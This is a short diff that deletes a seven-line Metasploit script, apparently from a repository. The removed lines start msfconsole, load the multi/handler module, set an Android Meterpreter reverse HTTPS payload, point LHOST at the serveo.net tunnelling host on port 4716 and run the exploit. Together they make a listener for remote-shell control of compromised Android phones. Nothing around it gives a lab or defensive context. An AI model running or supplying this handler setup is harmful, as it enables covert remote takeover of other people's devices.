@@ -1,7 +1,0 @@
-msfconsole
-use exploit/multi/handler
-set payload android/meterpreter/reverse_https
-set LHOST serveo.net
-set LPORT 4716
-exploit
-?
